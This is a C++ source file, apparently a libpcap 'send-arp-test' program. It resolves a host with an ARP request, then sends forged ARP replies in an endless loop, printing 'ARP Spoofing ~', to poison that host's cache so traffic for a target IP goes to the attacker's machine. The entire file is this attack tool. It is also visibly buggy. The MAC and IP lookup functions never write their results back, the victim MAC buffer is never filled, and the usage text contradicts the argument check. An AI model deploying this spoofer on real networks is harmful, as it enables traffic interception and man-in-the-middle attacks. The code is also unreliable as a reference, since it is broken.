#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#define ETHER_ADDR_LEN 6


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct libnet_ethernet_hdr{
	u_int8_t  ether_dhost[ETHER_ADDR_LEN];/* destination ethernet address */
	u_int8_t  ether_shost[ETHER_ADDR_LEN];/* source ethernet address */
	u_int16_t ether_type;                 /* protocol */
};

#pragma pack(pop)

void getmyMacAddress(const char* mac)
{
   	int fd;
	
	struct ifreq ifr;
	Mac mymac;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name , (const char *)mac , IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);
	
	mymac = (uint8_t*)ifr.ifr_hwaddr.sa_data;
}

void get_my_ipv4_address(const char* ipv4) {
	int fd;
	struct ifreq ifr;
	uint32_t myip;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char*)ifr.ifr_name, ipv4, IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	myip = ntohl((((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr).s_addr);
}

void usage() {
	printf("syntax: send-arp-test <interface> <send ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    char mymac[32]={0};
	char youmac[32]={0};
	char myip[20]={0};

	getmyMacAddress (mymac);
	get_my_ipv4_address (myip);
	//printf("your mac address : ",mymac);
	//printf("\n");
	//printf("your ip address : ", myip);
	//printf("\n");

	EthArpPacket packet;
	

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(mymac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(mymac);
	packet.arp_.sip_ = htonl(Ip(myip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	EthArpPacket reply_packet;

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	while(1)
	{
		struct pcap_pkthdr* header;
		const u_char* capacket;
		res = pcap_next_ex(handle, &header, &capacket);

		reply_packet =*(EthArpPacket*)capacket;
		if (reply_packet.eth_.type_ == htons(EthHdr::Arp)){
            if(reply_packet.arp_.op_== htons(ArpHdr::Reply)){
				printf("~~.. reply ..~~ \n");
				break;
			}
		}
	}

	// memcpy(youmac, reply_packet.arp_.smac_, 6);

	EthArpPacket arp_packet;
    arp_packet.eth_.dmac_ = Mac(youmac);
    arp_packet.eth_.smac_ = Mac(mymac);
    arp_packet.eth_.type_ = htons(EthHdr::Arp);

    arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
    arp_packet.arp_.hln_ = Mac::SIZE;
    arp_packet.arp_.pln_ = Ip::SIZE;
    arp_packet.arp_.op_ = htons(ArpHdr::Reply);
    arp_packet.arp_.smac_ = Mac(mymac);
    arp_packet.arp_.sip_ = htonl(Ip(argv[3]));
    arp_packet.arp_.tmac_ = Mac(youmac);
    arp_packet.arp_.tip_ = htonl(Ip(argv[2]));

	while(1)
	{
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("ARP Spoofing ~\n ");
        sleep(1);
	}

	pcap_close(handle);
}
